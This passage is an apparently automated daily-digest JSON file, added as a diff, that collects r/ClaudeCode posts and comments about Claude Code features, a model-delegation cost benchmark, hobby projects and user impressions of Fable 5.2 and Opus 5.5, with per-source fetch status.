@@ -1,0 +1,1064 @@
+{
+ "date": "2026-11-17",
+ "collected_at": "2026-11-17T10:38:39Z",
+ "window_start": "2026-11-16T10:38:39Z",
+ "sources_status": {
+  "YouTube: Better Stack": {
+   "ok": true,
+   "count": 0
+  },
+  "YouTube: AI Engineer": {
+   "ok": true,
+   "count": 1
+  },
+  "YouTube: Theo - t3.gg": {
+   "ok": true,
+   "count": 0
+  },
+  "YouTube transcripts": {
+   "ok": false,
+   "count": 0,
+   "note": "0/1 videos with transcript; errors: youtube-transcript-api UCL4K36SHp0: IpBlocked: \nCould not retrieve a transcript for the video https://www.youtube.com/watch?v=UCL4K36SHp0! This is most likely caused by:\n\nYouTube is blocking requests from your IP. This usually is due to one of the | yt-dlp UCL4K36SHp0: ERROR: [youtube] UCL4K36SHp0: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See  https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp  for how to manually pass cookies. Also see  https://github.com/yt-dlp/yt-dlp/wiki/Extract"
+  },
+  "Reddit: r/ClaudeCode": {
+   "ok": true,
+   "count": 10,
+   "note": "via RSS fallback (JSON failed: 403 Client Error: Blocked for url: https://api.reddit.com/r/ClaudeCode/top?t=day&limit=50&raw_json=1)"
+  },
+  "Reddit: r/ClaudeAI": {
+   "ok": true,
+   "count": 10,
+   "note": "via RSS fallback (JSON failed: 403 Client Error: Blocked for url: https://api.reddit.com/r/ClaudeAI/top?t=day&limit=50&raw_json=1)"
+  },
+  "GitHub releases: anthropics/claude-code": {
+   "ok": false,
+   "count": 0,
+   "error": "403 Client Error: Forbidden for url: https://api.github.com/repos/anthropics/claude-code/releases?per_page=30"
+  },
+  "GitHub releases: openai/codex": {
+   "ok": false,
+   "count": 0,
+   "error": "403 Client Error: Forbidden for url: https://api.github.com/repos/openai/codex/releases?per_page=30"
+  },
+  "RSS: OpenAI News": {
+   "ok": true,
+   "count": 4
+  },
+  "RSS: Simon Willison": {
+   "ok": true,
+   "count": 2
+  },
+  "RSS: Google DeepMind Blog": {
+   "ok": true,
+   "count": 0
+  },
+  "Web: Anthropic News": {
+   "ok": true,
+   "count": 0,
+   "note": "22 links on index, 22 new checked"
+  },
+  "Web: Anthropic Engineering": {
+   "ok": true,
+   "count": 0,
+   "note": "24 links on index, 24 new checked"
+  },
+  "Web: Claude Blog": {
+   "ok": true,
+   "count": 0,
+   "note": "11 links on index, 11 new checked"
+  },
+  "Hacker News": {
+   "ok": true,
+   "count": 17,
+   "note": "17 matches >= 80 points"
+  }
+ },
+ "counts": {
+  "news": 22,
+  "youtube": 1,
+  "reddit": 20
+ },
+ "items": [
+  {
+   "id": "youtube:UCL4K36SHp0",
+   "section": "youtube",
+   "source": "AI Engineer",
+   "title": "Let's Open Source the World — Brandon Thomas, ArtCraft",
+   "url": "https://www.youtube.com/watch?v=UCL4K36SHp0",
+   "published": "2026-11-16T13:00:07Z",
+   "description": "ArtCraft’s first Photoshop approximation took about 24 hours to build, Brandon Thomas says. At CODE Summit 2026, he explains how Rust and AI coding agents power open source alternatives to Adobe’s creative tools, Microsoft Office and Figma. MCP and CLI automation, Linux support, reusable UI components and CI bottlenecks lead into Autocraft, a forthcoming software factory for issue triage, agentic development, evaluations and post training.\n\nSpeaker info:\n- https://github.com/echelon\n- https://x.com/echelon\n- https://getartcraft.com/apps\n\nTimestamps:\n0:00 - Open sourcing the world\n2:30 - The open web before closed platforms\n4:29 - Subscriptions, gatekeepers and lost ownership\n6:47 - ArtCraft and artists coding their workflows\n9:17 - A Photoshop approximation in 24 hours\n11:10 - Viral growth and artists embracing AI\n12:13 - Beyond Adobe: office, CAD and collaboration\n14:17 - Linux, localization and programmable apps\n16:11 - Why Rust, native GUIs and CI\n17:35 - Human review and the Autocraft software factory",
+   "transcript": null,
+   "transcript_status": "no transcript (blocked by YouTube)",
+   "views": 81338
+  },
+  {
+   "id": "reddit:1xy0xr9",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "PSA: Claude Code has an experimental \"Code Mode\" now (batches tool calls into JS)",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xy0xr9/psa_claude_code_has_an_experimental_code_mode_now/",
+   "published": "2026-11-16T20:53:44Z",
+   "score": null,
+   "text": "Spotted this in the recent changelog and got it running in v2.1.325 (screenshot attached). If you haven't tried Code Mode yet, it changes how Claude handles multi-step tasks.\n Instead of running tool calls one by one and dumping every raw output into your context window, Claude writes a single JavaScript script behind the scenes. It batches tasks in parallel, filters out noise locally, and only returns the distilled results it needs.\n Simple but brilliant\n Pretty big, cumulative context savings: Giant logs and grep outputs get filtered inside the JS script before hitting the context\n It's great for big tasks, shines during repo-wide audits, bug tracing, and chaining MCP servers.\n Anyone else daily-driving this since it dropped on the 12th? Curious how much token usage it's saving you on larger repos.\n submitted by /u/Poatri_US \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Claude code has a \"code\" mode? Holy shit",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I wonder when they’ll add a Claude mode",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Claude Code Code Claude Mode",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "sorry, that was too obvious!\n https://preview.redd.it/n7zu6e00j12i1.jpeg?width=622&format=pjpg&auto=webp&s=1eb3b965a89bc0b956f81902698f57f7b3a30486",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Yo dawg I heard you like code\n So I put code mode in your\n You've reached your weekly usage limit.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Isn't this what it always did, just with Python?",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "In regular python it didn't have access to the harness tools like MCPs, but this does. I believe this pattern was made popular by Pi agent and later OpenCode adopted it",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "This is actually huge.\n Imagine you have two MCP Servers. One for Granola and one for notion. You want Claude to copy your transcripts from granola to notion.\n Right now, the way Claude does that is calling granola MCP to read, passing those transcripts through context, then passing those back into notion MCP to write. So you pay for all those tokens, risk Claude hallucinating in the copy, and expose all those transcripts to the model.\n Code mode just wraps the two MCP servers in some JavaScript and lets it rip.\n This idea has been around for ages. It's crazy it took them this long to implement it. https://developers.cloudflare.com/agents/tools/codemode/",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Claude 'Code' has a Code Mode, no points for naming, sorry Dario.",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxmmg3",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "I did this thing, i don't know how to feel about it",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxmmg3/i_did_this_thing_i_dont_know_how_to_feel_about_it/",
+   "published": "2026-11-16T11:03:47Z",
+   "score": null,
+   "text": "Inspired by the project of tech4bot ( https://github.com/tech4bot/rk3562deb ) i tried installing debian native on this cheap ass tablet, the ouzrs m1. The tablet was locked as hell, no way to unlock bootloader or change the rom from the crappy android 11 go it had by default. I gave it to Claude and it was quite a journey: Claude tried flashing an arm version on debian with rockchip software tools and it fully bricked the tablet. We trobleshooted a bit, i opened it up and found a serial port inside the tablet, i made Claude recover the tablet via serial and with some trial and error it booted into debian. After that Claude found that it could boot from sd card and little by little it reverse engineered all the drivers to work in debian. It also found that the 4 gb of ram in android were fake and it only has 2 gigs lol. Should i publish this project (for the other 2 people that have this tablet beside me lol)? The performance of the tablet is really meh but at least it can receive updates now. \n submitted by /u/MrSimpatia17 \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "yeah publish it why not someone might find it useful also shitty to lose half the ram there lol",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Publish it. Half the RAM gone is a sacrifice worth documenting.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "you cannot lose that which does not exist",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "So tablets be selling fake RAM now? What have we come to",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I did some googling and it is quite common with chinese tablets, has cpuz fooled too",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Dude, this is magic!!!\n Imagine this being posted on the NET back in the 2010s",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Wish i had the skills to pull this off back then lol",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Well, to be fair, you still don't have the skills.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Full credits to Claude bro lol",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxyc5a",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Does delegating to cheaper models actually save money? Part 2: bigger codebases, coding tasks and Haiku alone",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxyc5a/does_delegating_to_cheaper_models_actually_save/",
+   "published": "2026-11-16T19:16:54Z",
+   "score": null,
+   "text": "TL;DR \n - I’ve run about 300 benchmarks on real open-source codebases, testing how Claude Code splits work between models (Opus as the lead, cheaper models like Haiku as helpers) and when that pays off. It depends on codebase size and task.\n - On small jobs, Opus alone can be cheaper than Opus + subagents , and more accurate on small-codebase reviews, probably because of less overhead and cheap cached context.\n - Opus told not to delegate may work harder than Opus left alone : on one big docs check it wrote about 50% more, cost more and found more errors (44 vs 36).\n - On coding, Opus + Haiku saved about 20-30% at the same quality. But Haiku alone is very capable for the price on well-defined tasks with tests: about 5% of Opus alone's cost , with almost the same results, though a bit less thorough.\n - Here’s one of the most important charts of this project. On an 85-page docs check, Opus + Haiku read almost 3 times as much as Opus alone and wrote 8 times as many tokens, yet cost 53% less and found 72 real errors against 49. Several subagents probably cover much more ground, which makes up for Haiku being weaker.\n https://preview.redd.it/dsp2v5wdx02i1.png?width=3000&format=png&auto=webp&s=5d16a117b2036755e238cd03a6ba74847d2ddd9e \n ---\n A couple of weeks ago I shared an experiment ( https://www.reddit.com/r/ClaudeCode/comments/1xn18cu/does_delegating_to_cheaper_models_actually_save/ ) testing whether Claude Opus uses subagents effectively. I compared four setups:\n - Forced Opus: told not to use subagents. \n - Spontaneous Opus: free to delegate, but it never did. \n - Skill-routed: my skill chooses when to delegate and to which model. \n - Forced Haiku: all subagents use Haiku, while Opus plans and checks. \n On my smallest codebase (~10k lines), delegating didn't really pay off. Forced Haiku saved 5% at best, Skill-routed cost 14-30% more, and Forced Opus found far more known doc errors on the reading-heavy tasks (7 and 8 of 9, against 3 and 2). My guess is that Opus can often write a quick script instead of reading everything, and it reuses its own cached context cheaply, while each subagent has to build its own. On small tasks, that overhead can outweigh the cheaper tokens. \n On larger codebases, Forced Haiku held its own for much less. It cost 41% less on rich (~22k lines) and found nearly as many doc errors. It cost 75% less on beets (~52k lines), finding more errors on the reference docs but fewer on the 80-page plugin check, where it cost about a sixth as much.\n In v2 I pushed further: a ~100k-line codebase (buildbot) with 3 reading tasks, 7 coding tasks scored by hidden tests, and then 16 short coding tasks, most hiding a trap. I also added Opus alone (subagents blocked, no instruction), Haiku alone and Sonnet alone (no Opus at all).\n On an 85-page docs check, Opus + Haiku found 58 and 63 of 92 real errors, against 36 and 38 for Opus alone, at less than half the cost ($1.93 vs $4.11 per run). How come?! \n My theory was that Opus + Haiku simply *works more*, and that the extra coverage makes up for Haiku being weaker. The numbers seem to fit: Opus + Haiku wrote about 8 times as many tokens and read nearly 3 times as much, yet the bill still halved. \n https://preview.redd.it/kcczzpugx02i1.png?width=3000&format=png&auto=webp&s=a01c991d415349f065b608bea8398d3b135e81c4 \n Haiku may be less capable than Opus individually, but when orchestrated by Opus, its subagents can cover much more context in parallel. Each one may go less deep, but together they cover more ground, and that seems to compensate for the lower model quality. Haiku is apparently smart enough, with Opus directing and checking the work, to deliver surprisingly good results at a much, much lower cost than Opus alone.\n This is in line with Anthropic's own write-up on their [multi-agent research system]( https://www.anthropic.com/engineering/multi-agent-research-system ), where token usage alone explained 80% of performance variance on a research benchmark. The same article says coding is usually a poorer fit for multiple agents, and that matches what I saw: on coding, Opus + Haiku saved 20-30% at the same quality, against about half the cost and more errors found on reviews. Their setup isn't mine, so it's context, not proof.\n The next chart shows the bigger picture: every setup on two big docs checks, with errors found, reading depth, output tokens (thinking included), and cost.\n https://preview.redd.it/w0l5skxjx02i1.png?width=3000&format=png&auto=webp&s=340e1c785ad0eb30498d7e143b9b0d67a4081fd9 \n Interestingly, it seems that *forcing* Opus not to delegate may have pushed it to work deeper and harder. On the beets plugin-doc check, Forced Opus read less than the delegated setups and still found the most errors. Compared with Spontaneous Opus, it read about the same but wrote around 50% more tokens, thinking included, cost 53% more, and found more errors (44 vs 36 across two runs). Tokens alone don't prove effort, but finding more errors makes the case stronger.\n The following chart shows the token counts side by side.\n https://preview.redd.it/8qnlknulx02i1.png?width=3000&format=png&auto=webp&s=f808c58236cfbf0a352d9b32127f8c147fe0e2c3 \n Maybe the instruction made it work harder, maybe it's the smaller codebase, or maybe it's just chance. I haven't tested which.\n Left alone, Opus never delegated in my runs, even on big jobs. So for large reviews, pushing it to delegate to Haiku could be the best strategy.\n I'm working on a skill that picks the best approach: use Opus + Haiku when it makes sense, or tell you to switch to Haiku manually and give you the prompt. A script that starts a new Haiku session might allow fully autonomous switching, but I'm still checking feasibility and Anthropic's terms.\n The other v2 results \n Honestly, Haiku really surprised me. It seems to be very capable at coding, if the task is detailed and contained enough. Opus is still the more thorough model when it comes to reviewing and checking, but Haiku held its own on specific tasks.\n Reading a ~100k-line codebase \n https://preview.redd.it/2xqol76px02i1.png?width=3000&format=png&auto=webp&s=a8ebbe1a7d5cf70d58a6e4d7ae953d0f5f1f648a \n Across three reading tasks, Opus + Haiku cost 51% less than Opus alone. Every setup covered all 400 modules, and Opus + Haiku found the most errors on the 2-page docs check (20 and 23 of 42, against 10 and 17).\n Writing code on a small project \n https://preview.redd.it/hvskywhrx02i1.png?width=3000&format=png&auto=webp&s=95c8999ed716f2f1cc05594e39ffc913ff9bbf9d \n Every setup produced working code. On the harder tasks: Opus $2.41, Opus + Haiku $1.80 (25% less), Sonnet $0.76, Haiku $0.11.\n Writing code on a ~100k-line codebase \n https://preview.redd.it/kuja6mztx02i1.png?width=3000&format=png&auto=webp&s=cf644a53f44ee3748019d63280111caf614cadba \n Same pattern on cost: $1.95 for Opus alone, $1.36 for Opus + Haiku (30% less), down to $0.15 for Haiku alone. But Opus-led setups also added an implied database index. Haiku alone didn't, and my tests didn't catch it.\n Correction: the charts also show Opus \"flagging a symptom that didn't fit\". More runs later showed that depended on the day the runs happened, not the model, so I no longer count it. Details are in the repo. \n Quality vs price \n https://preview.redd.it/xefaymgwx02i1.png?width=3000&format=png&auto=webp&s=d9e22a9ba2925f7c56a135d0c16d7e7153163cf4 \n Opus + Haiku was cheapest per real error on both big docs checks: $0.03 on buildbot and $0.05 on beets, against $0.11 and $0.25 for Opus only.\n The harder coding tasks \n https://preview.redd.it/kw46b52zx02i1.png?width=3000&format=png&auto=webp&s=b0896889c781fb1a20ce5b9951503001a9f0ec8e \n Then I tried to make the cheaper models fail. 16 short coding tasks, most hiding a trap: false claims, a wrong bug report, a timing bug, contradictory tests/docs, hidden instructions in comments, planted review bugs, and \"dead\" code that's actually alive.\n 128 runs. Combined cost: Opus $7.00, Opus + Haiku $6.30, Sonnet $2.30, Haiku $0.36.\n Hidden tests barely separated anyone: one real miss in 128 runs, from Sonnet. Opus was more thorough in code review, finding all 3 planted bugs every time, against Haiku's 2 of 3. But on the timing bug, 7 of 8 runs failed, including all 4 Opus-led ones. The only pass was Haiku.\n On tasks this short, Opus + Haiku saved little (10% overall), because Opus was most of the bill. Haiku alone did almost the same work for about 5% of the cost.\n So, for now: big reviews, Opus + Haiku. Small, well-defined coding tasks with tests, Haiku alone is surprisingly good. If every case must be covered, keep Opus involved. \n Small experiment, mostly two runs per setup, costs estimated at API prices. Claude Opus also wrote my tests and judged the results, so there's no independent judge.\n Full results, charts and checker:\n https://github.com/Manuele-T/claude-model-router \n submitted by /u/BeginningSir7334 \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "https://preview.redd.it/hx4gdte0032i1.jpeg?width=1041&format=pjpg&auto=webp&s=0e37ecd950c997bb684272347990be981caa78a3",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "cant just look at it from cost perspective, gotta account for time too, since time is money as they say",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Fair point, I’ll add wall time per task. I already log it from the transcripts, it just didn’t make the post.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Thank you for this excellent work!",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "When I saw the length of the post which is still a brilliant post, it however gave me flashbacks to the long outputs from Claude and I stopped reading. \n I feel I’m only taking in info I need these days. There just too much out there.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I am okay if the content is skimmable, I think this post is.\n I can just skim the image, read few words in the beginning of the paragraph, to get whether I should read the details or not.\n A lot of the AI output right now are basically word vomit that is very hard to read. I don't know if this AI, but it is still well section IMO.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Saved for research",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Thank you for this. Definitely going to be having a different LLM take a look at some of this data to establish new guideline suggestions for projects moving forward.\n I’m brand new to all of this with 0 coding experience unless you count MySpace HTML and I’ve learned a lot so I’m looking forward to sharing my own findings to help people like myself get started.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Two more tests:\n Haiku /advisor Opus (or different advisor config)\n Opus low subagent instead of haiku",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxq60j",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Made a small plugin that adds copy buttons to Claude Code’s terminal",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxq60j/made_a_small_plugin_that_adds_copy_buttons_to/",
+   "published": "2026-11-16T14:04:39Z",
+   "score": null,
+   "text": "I wanted the kind of copy button the desktop and web apps have, but in the terminal. Selecting text there is awkward and glitchy, and while /copy works, I never found it intuitive, and it leaves a /copy line in the conversation each time (you can rewind after every copy, but that gets old).\n So I made a small plugin that puts copy buttons on code blocks, on tables (which can be pasted straight into a spreadsheet), and at the end of each reply. Sharing in case it's useful to anyone else.\n /plugin install copy-buttons --marketplace leonasdev/copy-buttons \n It needs fullscreen mode , which is probably already on for you. If not, run /tui fullscreen .\n I've tested it on Linux, macOS and Windows, and since it relies on how Claude Code draws replies, I test it against each new release too. If it misbehaves in your terminal emulator, let me know and I'll fix it.\n https://github.com/leonasdev/copy-buttons \n submitted by /u/leonasdev \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeCode/comments/1xxq60j/made_a_small_plugin_that_adds_copy_buttons_to/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxvbo6",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Fable 5.2 used my entire 5-hour quota while only being active for 1 second.",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxvbo6/fable_52_used_my_entire_5hour_quota_while_only/",
+   "published": "2026-11-16T17:23:38Z",
+   "score": null,
+   "text": "submitted by /u/DiamondPG1 \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeCode/comments/1xxvbo6/fable_52_used_my_entire_5hour_quota_while_only/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xy8f5q",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Fast and Furious Actor VibeCodes (in chat) Billion Dollar Idea",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xy8f5q/fast_and_furious_actor_vibecodes_in_chat_billion/",
+   "published": "2026-11-17T02:16:12Z",
+   "score": null,
+   "text": "Cut down from a 14 minute video but what the actual fuuuuu 😭\n submitted by /u/benbackwards \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeCode/comments/1xy8f5q/fast_and_furious_actor_vibecodes_in_chat_billion/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xyfuh3",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Four Ultras, what else can a man wish for?",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xyfuh3/four_ultras_what_else_can_a_man_wish_for/",
+   "published": "2026-11-17T09:13:29Z",
+   "score": null,
+   "text": "submitted by /u/vovazk \n [link] [comments]",
+   "comments": [
+    {
+     "error": "429 Client Error: Too Many Requests for url: https://www.reddit.com/r/ClaudeCode/comments/1xyfuh3/four_ultras_what_else_can_a_man_wish_for/.rss?sort=top&limit=11"
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxwblw",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "Asked Claude to build an entire Scottish village in Blender",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxwblw/asked_claude_to_build_an_entire_scottish_village/",
+   "published": "2026-11-16T18:01:15Z",
+   "score": null,
+   "text": "I asked Claude Code to recreate an entire Scottish village in Blender, and I was genuinely surprised by how much it managed to do in one shot.\n It researched the location, analysed the terrain, looked at reference photos, and generated the whole scene procedurally.\n The interesting part was how similar the experience felt to coding with AI. Getting the first 80% done was surprisingly easy, but the details became increasingly tricky. Small changes would sometimes introduce regressions elsewhere, and getting everything to look natural took quite a bit of iteration.\n Still, pretty impressive stuff...\n I also generated a real-time demo so you can explore the village yourself. It takes about a minute to compile the shaders on first launch and can be quite demanding on laptops.\n GitHub pages demo \n submitted by /u/luke__uk \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "That's an awful lot of sunshine for Scotland...",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "LOL. I definatelly prioritised artistic effect over realism but fear not! If your run the demo you can have as much wind, snow and rain as you need.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Immediately came here to say this 😂",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "https://giphy.com/gifs/26BRq3yxyHFAt9AYw \n the villagers:",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I agreed with you. Although blender is mainly used to render 3D images right?",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Loading the demo... GPU and CPU go Brrrrrrrrr!\n Opus 5.5 or Fable 5.2?\n I would say it's very very nice. Might tweak the stone masonry texture a bit as it feel high contrast normal map right now, not smooth GI like the rest.\n https://preview.redd.it/svm5jdg6q02i1.png?width=321&format=png&auto=webp&s=c56174dcbf10b15614beb53f7f690191a0ab7aa9 \n The atmospheric lighting work very well in the scene. \n And you need a cat.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Can I know the prompt? I was trying to make an icelandic island inside UE during the weekend but it was so trash I lost all my belief in Claude's abilities to create realistic worlds 😭",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Sure, nothing fancy really. I don't remember verbatim but it was along the lines of:\n Build a realistic model of a Scottish village - Laggan. Follow these steps:\n - Make a deep research about the village, and terrain. Analyse google maps, reference images and other available materials.\n - Build terrain, roads and rivers. Don't work on details. Represent houses as boxes.\n - Build houses, bridges and the church.\n After that there was a lot of back and forth.\n You don't need to be a 3D artist to guide it. If you don't like results and you're unsure why, you can upload render to ChatGPT and ask for a prompt for Claude ;-)",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "I think the fact that it is a real village that it can essentially trace makes it much easier",
+     "replies": []
+    }
+   ]
+  },
+  {
+   "id": "reddit:1xxsqu4",
+   "section": "reddit",
+   "source": "r/ClaudeCode",
+   "title": "After burning tokens with Fable 5.2, I appreciate Opus 5.5 more",
+   "url": "https://www.reddit.com/r/ClaudeCode/comments/1xxsqu4/after_burning_tokens_with_fable_52_i_appreciate/",
+   "published": "2026-11-16T15:47:23Z",
+   "score": null,
+   "text": "Fable 5.2 is an insane model. It really is, you can clearly see the depth and knowledge. But; The model is insanely lazy af. The model by default is so unproductive and unmotivated. I was kinda hyped about this and dumbed him a lot information about planning, using skills, improvements and implementation of orchestra etc. Dude was like \"yea its seems like nothingburger bro good luck\". \n Sure, there is probably larger, complex challenges in the field that people use and get benefit of it but Fable is clearly too much for my project. \n Also, its a small experiment anyway but I had used Fable on High as a orchestra (creative ik) and did a simple test; \n I had one task to be done in the project that is fairly challenging. Probably need couple of more session to make it. I said Fable to make a mirror of this task with exact prompts and test Opus 5.5 High and Fable 5.2 Medium on which can do better. \n First results were Opus produced almost no error while Fable did 2 decisions by itself, also produced a 2 error that wastes CI. \n Fable 5.2 High as orchestrator literally said he is kinda biased to his own model and for the sake of quality spawned 5-10 agent to did additional code reviews thinking the \"code reviews\" were biased or missed \"Opus\" possible mistakes. The result: It did missed a couple of more errors but not for the Opus but the Fable.... \n I don't know, I am not very experienced with AI fairly using for the past 2-3 months and my project is not large nor complex but fairly challenging in terms of desing and consistency. There is probably better areas or way to use Fable more effectively but I am good with Opus. \n Also....Fable 5.2 High burn tokens like a mad men and spawn additional agents even though I have rules for it. I had to tell 3 times to use Sonnet to not bloat his context. \n I would rather go with Opus 5.5 Extra or Max rather than relying on Fable tbh atleast for my project, what are your experiences with it? Open to feedback and improvement tbh \n submitted by /u/BazzerBiller \n [link] [comments]",
+   "comments": [
+    {
+     "score": null,
+     "body": "Hey! Thanks for posting to r/ClaudeCode \n While participating in this thread, please follow our community rules . Keep discussions constructive. Attack the idea, not the person.\n For help, project discussions, tips, and general chat, join the ClaudeCode Discord .\n I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "The official docs for Fable 5.2 state that it’s more likely to hedge and not act without permission more than previous models. Specifically, Fable views itself as a guest in someone else’s repo. They say explicitly empowering it to take lead can solve what people have termed “laziness”",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "This, it's surprising how so few actually read what anthropic writes. https://platform.claude.com/docs/en/build-with-claude/prompt-engineering/prompting-claude-fable-5-2 \n \"Say who owns the code Claude Fable 5.2 pays close attention to who owns the code it works on. In Anthropic’s testing on small coding tasks, the model tended to add to the existing structure when the prompt said nothing about ownership or presented the code base as someone else’s, even when that duplicated existing code. When the prompt said the code base was the model’s own, it often consolidated duplicated code and sometimes made related fixes without being asked.\n If you want the model to improve the structure as it works, say that the code is its own:\n You are the owner and long-term maintainer of this codebase, and its design is up to you. The ownership sentence makes the model much more likely to consolidate duplicated code into one shared function. In Anthropic’s testing on small coding tasks, the model consolidated duplicated code in under 10 percent of runs without the sentence and in about 75 percent of runs with it.\n With this prompt, output tokens rose by about 70 to 80 percent and the model made changes nobody had asked for, many of them new tests and documentation. In some runs, it also changed how an existing feature behaves. A closing PR summary from Claude Fable 5.2 often left out small changes, so review the reported diff and the summary.\n Leave the ownership sentence out where the user owns the code and wants it changed as little as possible. A rule that limits scope doesn’t cancel it. In Anthropic’s testing, the model still consolidated duplicated code in more than half of runs when “No drive-by refactors, renames or cleanups” appeared earlier in the same prompt.\"",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Fable 5.2 is a great pretender. It digs deep but never actually finishes anything. It’s pretty funny, actually.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "fable 5.2's laziness hits hard when you're pushing for execution, opposite of opus 5.5's steady grind. I ran a full dev cycle on fable 5.2, and it kept skipping steps until I forced it with step-by-step micro-commands. opus 5.5 just... does it.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "opus high for live\n token/results is just perfection for now",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "The Fable 5.2 docs say to add something like this to your Claude markdown: this workspace is your codebase. Once I did this, Fable 5.2 will actually work now instead of explaining what needs to be done all the time.",
+     "replies": []
+    },
+    {
+     "score": null,
+     "body": "Ok i got the same experience. Fable is actually not diving when expected to. Lazy is a good way to put it.\n Used it to its maximum, didn't discover an advantage, moved back to opus.",
+     "replies": []
+    },
+    {
+     "score": null,
